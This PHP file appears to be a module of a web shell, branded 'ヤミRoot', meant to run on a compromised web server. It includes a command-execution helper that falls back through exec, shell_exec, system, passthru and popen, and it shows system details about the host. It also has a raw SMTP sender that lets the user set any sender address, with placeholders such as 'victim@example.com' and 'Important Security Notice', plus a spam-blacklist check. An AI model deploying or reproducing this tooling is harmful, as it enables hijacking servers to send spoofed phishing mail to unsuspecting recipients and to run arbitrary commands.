<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
ini_set('memory_limit', '256M');
header('Content-Type: text/html; charset=UTF-8');
ob_end_clean();

$title = "ヤミRoot | SMTP Module";
$author = "0x6ick";
$bg = "#03001C";
$fg = "#FFFFFF";
$primary_grad = "linear-gradient(45deg, #FF00FF, #00C8FF)";
$secondary_grad = "linear-gradient(45deg, #00FFFF, #39FF14)";
$purple = "#A020F0";
$cyan = "#00FFFF";
$input_bg = "#110B3A";
$input_fg = "#00FFFF";
$font = "'Fira Code', monospace";

function x($c) {
    $o = '';
    if (function_exists('exec')) {
        @exec($c . ' 2>&1', $a);
        return implode("\n", $a);
    } elseif (function_exists('shell_exec')) {
        $o = @shell_exec($c . ' 2>&1');
        return $o ?: "shell_exec output empty";
    } elseif (function_exists('system')) {
        ob_start();
        @system($c . ' 2>&1');
        return ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($c . ' 2>&1');
        return ob_get_clean();
    } elseif (is_resource($f = @popen($c, "r"))) {
        $o = "";
        while (!@feof($f)) $o .= @fread($f, 1024);
        @pclose($f);
        return $o;
    }
    return "All execution functions disabled.";
}

// i() replaces getServerInfo()
function i() {
    $s['u'] = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $s['h'] = $_SERVER['HTTP_HOST'] ?? 'N/A';
    $s['n'] = $_SERVER['SERVER_NAME'] ?? 'N/A';
    $s['o'] = php_uname() ?? 'N/A';
    $s['p'] = PHP_VERSION ?? 'N/A';
    return $s;
}

// --- SMTP AND SPAM CHECK LOGIC ---

function smtpSend($host, $port, $from, $to, $subject, $body) {
    $timeout = 10; 
    $output = "";
    
    if (!function_exists('fsockopen')) return "FATAL: fsockopen() is disabled.";

    $socket = @fsockopen($host, $port, $errno, $errstr, $timeout);
    if (!$socket) return "Connection Failed ({$errno}): {$errstr}";

    // Read 220 Greeting
    $output .= fgets($socket, 1024);

    // EHLO
    fwrite($socket, "EHLO localhost\r\n");
    $output .= fgets($socket, 1024);

    // MAIL FROM
    fwrite($socket, "MAIL FROM:<{$from}>\r\n");
    $output .= fgets($socket, 1024);
    if (strpos($output, '250') === false) { fclose($socket); return "Sender rejected: " . trim($output); }

    // RCPT TO
    fwrite($socket, "RCPT TO:<{$to}>\r\n");
    $output .= fgets($socket, 1024);
    if (strpos($output, '250') === false) { fclose($socket); return "Recipient rejected: " . trim($output); }

    // DATA
    fwrite($socket, "DATA\r\n");
    $output .= fgets($socket, 1024);
    if (strpos($output, '354') === false) { fclose($socket); return "DATA rejected: " . trim($output); }

    // Send Headers & Body
    fwrite($socket, "Subject: {$subject}\r\n");
    fwrite($socket, "From: {$from}\r\n");
    fwrite($socket, "To: {$to}\r\n");
    fwrite($socket, "MIME-Version: 1.0\r\n");
    fwrite($socket, "Content-type: text/html; charset=iso-8859-1\r\n");
    fwrite($socket, "\r\n"); // Blank line before body
    fwrite($socket, $body . "\r\n");
    
    // End DATA and send mail (period + CRLF)
    fwrite($socket, ".\r\n");
    $output .= fgets($socket, 1024);

    // QUIT
    fwrite($socket, "QUIT\r\n");
    fclose($socket);

    return $output;
}

function smtpTest($host, $port) {
    $timeout = 5; 
    $host_esc = htmlspecialchars($host);
    $port_esc = intval($port);
    $output = "";

    if (!function_exists('fsockopen')) return "FATAL: fsockopen() function is disabled.";

    $socket = @fsockopen($host, $port, $errno, $errstr, $timeout);

    if (!$socket) {
        $output .= "Status: Connection Failed (❌)\nHost: {$host_esc}:{$port_esc}\nError: ({$errno}) {$errstr}";
        return $output;
    }

    $response = @fgets($socket, 1024);
    
    if (strpos($response, '220') === 0) {
        $output .= "Status: Connection Successful (✅)\nHost: {$host_esc}:{$port_esc}\nResponse: " . trim($response) . "\n";
        
        @fwrite($socket, "EHLO localhost\r\n");
        $response = '';
        while (!@feof($socket)) {
            $line = @fgets($socket, 1024);
            $response .= $line;
            if (strpos($line, '250') === 0) break;
        }
        
        $output .= "--- EHLO/HELO Response ---\n";
        $output .= trim($response);

    } else {
        $output .= "Status: Connection Established, but Server Rejected (⚠️)\nHost: {$host_esc}:{$port_esc}\nInitial Response: " . trim($response) . "\n";
    }

    @fclose($socket);
    return $output;
}

function spamCheck($domain) {
    $output = "--- SPAM REPUTATION CHECK ---\n";
    $domain = trim($domain);

    // 1. Check MX Record Existence
    if (!function_exists('checkdnsrr')) {
        $output .= "WARNING: checkdnsrr() is disabled. MX Check skipped.\n";
    } elseif (@checkdnsrr($domain, 'MX')) {
        $output .= "MX Record Status: FOUND (✅)\n";
    } else {
        $output .= "MX Record Status: NOT FOUND (❌) - Delivery likely FAIL.\n";
    }

    // 2. Simple DNSBL Check (Testing Sender Reputation)
    $ip = $_SERVER['SERVER_ADDR'] ?? '127.0.0.1';
    $reverse_ip = implode('.', array_reverse(explode('.', $ip)));
    $blacklist_host = "{$reverse_ip}.b.barracudacentral.org"; 
    
    $output .= "Sender IP: {$ip}\n";
    
    if (@gethostbyname($blacklist_host) !== $blacklist_host) {
        $output .= "DNSBL Check (Barracuda): LISTED (⚠️) - HIGH SPAM RISK!\n";
    } else {
        $output .= "DNSBL Check (Barracuda): NOT LISTED (✅) - Low immediate spam risk.\n";
    }
    
    return $output;
}

// --- FORM INPUT PROCESSING ---
$action = $_GET['action'] ?? 'test';
$output = '';
$server_info = i(); 

if (isset($_POST['do_tool'])) {
    $target_host = $_POST['target_host'] ?? '';
    $target_port = $_POST['target_port'] ?? 25;

    if ($action == 'test') {
        $output = spamCheck($target_host) . "\n\n";
        $output .= smtpTest($target_host, $target_port);
    } elseif ($action == 'send') {
        $from = $_POST['from'] ?? 'test@local.com';
        $to = $_POST['to'] ?? 'target@example.com';
        $subject = $_POST['subject'] ?? 'Test Subject';
        $body = $_POST['body'] ?? 'Test Body';
        
        // Use the domain of the target recipient for the MX check
        $target_domain = substr($to, strpos($to, '@') + 1);
        
        $output = spamCheck($target_domain) . "\n\n"; 
        
        $output .= smtpSend($target_host, $target_port, $from, $to, $subject, $body);
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
<title><?php echo htmlspecialchars($title); ?></title>
<style>
/* Fira Code is used */
*{box-sizing:border-box;margin:0;padding:0;font-family:<?php echo $font; ?>;color:<?php echo $fg; ?>} 
body{background:<?php echo $bg; ?>;min-height:100vh;padding:20px;background-image:repeating-linear-gradient(0deg,transparent,transparent 2px,#11111a 2px,#11111a 4px)}
.container{max-width:1200px;margin:0 auto}
.glitch{text-align:center;font-size:30px;color:white;margin:10px 0 20px;position:relative;text-transform:uppercase;letter-spacing:3px}
.glitch:before,.glitch:after{content:attr(data-text);position:absolute;top:0;left:0;width:100%;height:100%}
.glitch:before{left:2px;text-shadow:-2px 0 <?php echo $purple; ?>;clip:rect(44px,450px,56px,0);animation:ga 5s infinite linear alternate-reverse}
.glitch:after{left:-2px;text-shadow:-2px 0 <?php echo $cyan; ?>;clip:rect(44px,450px,56px,0);animation:ga 3s infinite linear alternate-reverse}
@keyframes ga{0%{clip:rect(32px,9999px,28px,0)}5%{clip:rect(13px,9999px,37px,0)}10%{clip:rect(40px,9999px,39px,0)}15%{clip:rect(14px,9999px,62px,0)}20%{clip:rect(63px,9999px,14px,0)}25%{clip:rect(43px,9999px,28px,0)}30%{clip:rect(24px,9999px,78px,0)}35%{clip:rect(52px,9999px,56px,0)}40%{clip:rect(79px,9999px,89px,0)}45%{clip:rect(60px,9999px,69px,0)}50%{clip:rect(38px,9999px,29px,0)}55%{clip:rect(26px,9999px,54px,0)}60%{clip:rect(42px,9999px,90px,0)}65%{clip:rect(15px,9999px,85px,0)}70%{clip:rect(48px,9999px,61px,0)}75%{clip:rect(73px,9999px,74px,0)}80%{clip:rect(8px,9999px,13px,0)}85%{clip:rect(76px,9999px,48px,0)}90%{clip:rect(19px,9999px,59px,0)}95%{clip:rect(26px,9999px,80px,0)}100%{clip:rect(59px,9999px,30px,0)}}
.menu{display:flex;flex-wrap:wrap;justify-content:center;gap:10px;margin:20px 0;padding:15px;background:#110B3A;border:1px solid <?php echo $purple; ?>;border-radius:10px;box-shadow:0 0 15px rgba(160,32,240,0.4)}
.menu a{padding:10px 15px;color:<?php echo $cyan; ?>;text-decoration:none;border-radius:8px;transition:all 0.3s;border:1px solid transparent}
.menu a:hover{color:white;border:1px solid <?php echo $cyan; ?>;background:rgba(0,255,255,0.1);transform:translateY(-2px)}
.menu a.active{background:<?php echo $secondary_grad; ?>;color:#000;font-weight:bold;box-shadow:0 0 10px rgba(57,255,20,0.6)}
.box{background:#110B3A;margin:25px 0;padding:25px;border:2px solid <?php echo $purple; ?>;border-radius:12px;box-shadow:0 0 20px rgba(160,32,240,0.8)}
.header{color:<?php echo $cyan; ?>;text-align:center;font-size:1.8em;margin-bottom:25px;text-transform:uppercase;letter-spacing:2px;border-bottom:2px solid <?php echo $purple; ?>;padding-bottom:15px}
.form-group{margin-bottom:20px}
.form-group label{display:block;margin-bottom:8px;font-size:0.95em;font-weight:bold;text-transform:uppercase;letter-spacing:1px;color:<?php echo $cyan; ?>}
input[type="text"],select,textarea{width:100%;padding:12px;background:<?php echo $input_bg; ?>;color:<?php echo $input_fg; ?>;border:1px solid <?php echo $purple; ?>;border-radius:4px;font-size:1em;transition:all 0.3s;resize:vertical}
input[type="text"]:focus,select:focus,textarea:focus{border-color:<?php echo $cyan; ?>;box-shadow:0 0 15px <?php echo $cyan; ?>;outline:none}
input[type="submit"]{width:100%;padding:14px;background:<?php echo $primary_grad; ?>;color:#000;font-weight:bold;border:none;border-radius:4px;cursor:pointer;transition:all 0.3s;font-size:1.1em;text-transform:uppercase;letter-spacing:2px;box-shadow:0 0 15px rgba(255,0,255,0.7)}
input[type="submit"]:hover{background:<?php echo $secondary_grad; ?>;box-shadow:0 0 25px rgba(57,255,20,0.9);transform:translateY(-3px)}
pre{background:#000;border:2px solid <?php echo $input_fg; ?>;padding:20px;overflow-x:auto;white-space:pre-wrap;color:<?php echo $input_fg; ?>;border-radius:5px;margin-top:25px;box-shadow:0 0 15px rgba(0,255,255,0.4)}
.footer{text-align:center;padding:20px;font-size:0.9em;color:<?php echo $fg; ?>}
/* INFO BOX STYLES */
.info-box {
    background: #110B3A;
    border: 2px solid <?php echo $purple; ?>;
    border-radius: 10px;
    padding: 15px;
    margin-bottom: 25px;
    box-shadow: 0 0 10px rgba(160,32,240,0.5);
    font-size: 0.9em;
}
.info-box table {width: 100%;border-collapse: collapse;}
.info-box td {padding: 5px 0;}
.info-box i {color: <?php echo $cyan; ?>;margin-right: 10px;}
.info-box .label {color: white; font-weight: 700;width: 30%;}
.info-box .value {color: <?php echo $fg; ?>;}
@media(max-width:768px){.menu{flex-direction:column}.menu a{margin:3px 0}}
</style>
</head>
<body>
<div class="container">
<h1 class="glitch" data-text="<?php echo htmlspecialchars($title); ?>"><?php echo htmlspecialchars($title); ?></h1>

<div class="info-box">
    <table>
        <tr>
            <td class="label"><i class="fas fa-user"></i> User / IP</td>
            <td class="value">: <?php echo htmlspecialchars($server_info['u']); ?></td>
        </tr>
        <tr>
            <td class="label"><i class="fas fa-desktop"></i> Host / Server</td>
            <td class="value">: <?php echo htmlspecialchars($server_info['h']) . " / " . htmlspecialchars($server_info['n']); ?></td>
        </tr>
        <tr>
            <td class="label"><i class="fas fa-microchip"></i> System / PHP</td>
            <td class="value">: <?php echo htmlspecialchars($server_info['o']) . " / v" . htmlspecialchars($server_info['p']); ?></td>
        </tr>
    </table>
</div>
<div class="menu">
    <a href="?action=test" class="<?php echo $action == 'test' ? 'active' : ''; ?>"><i class="fas fa-plug"></i> Connection Tester</a>
    <a href="?action=send" class="<?php echo $action == 'send' ? 'active' : ''; ?>"><i class="fas fa-paper-plane"></i> SMTP Sender</a>
</div>

<div class="box">
<div class="header"><i class="fas fa-envelope"></i> SMTP Module - <?php echo ucwords($action); ?></div>

<?php if ($action == 'test'): ?>
<form method="POST"><div class="form-group">
<label>Target Host (IP or Domain)</label>
<input type="text" name="target_host" placeholder="smtp.example.com" required>
</div><div class="form-group">
<label>Port (Default: 25, 465, or 587)</label>
<input type="text" name="target_port" placeholder="25" value="<?php echo $_POST['target_port'] ?? '25'; ?>" required>
</div><input type="submit" name="do_tool" value="TEST CONNECTION"></form>

<?php elseif ($action == 'send'): ?>
<form method="POST">
    <div class="form-group">
        <label>Target Host (IP or Domain)</label>
        <input type="text" name="target_host" placeholder="smtp.example.com" required>
    </div>
    <div class="form-group">
        <label>Port (Default: 25, 465, or 587)</label>
        <input type="text" name="target_port" placeholder="25" value="<?php echo $_POST['target_port'] ?? '25'; ?>" required>
    </div>
    <div class="form-group">
        <label>MAIL FROM (Sender Address)</label>
        <input type="text" name="from" placeholder="tester@example.com" value="<?php echo $_POST['from'] ?? ''; ?>" required>
    </div>
    <div class="form-group">
        <label>RCPT TO (Recipient Address)</label>
        <input type="text" name="to" placeholder="victim@example.com" value="<?php echo $_POST['to'] ?? ''; ?>" required>
    </div>
    <div class="form-group">
        <label>Subject</label>
        <input type="text" name="subject" placeholder="Important Security Notice" value="<?php echo $_POST['subject'] ?? ''; ?>" required>
    </div>
    <div class="form-group">
        <label>Body (HTML Allowed)</label>
        <textarea name="body" rows="5" required><?php echo $_POST['body'] ?? '<html><body><h1>Test Message from YamiRoot Lab.</h1></body></html>'; ?></textarea>
    </div>
    <input type="submit" name="do_tool" value="SEND EMAIL">
</form>
<?php endif; ?>

<?php if(!empty($output)): ?>
<h4 style="color:<?php echo $cyan;?>;margin-top:25px;text-align:left;">Output:</h4>
<pre><?php echo htmlspecialchars($output); ?></pre>
<?php endif; ?>
</div>
<div class="footer">Coded With &#x1f497; by <span style="color:<?php echo $purple;?>"><?php echo htmlspecialchars($author); ?></span></div>
</div>
</body>
</html>
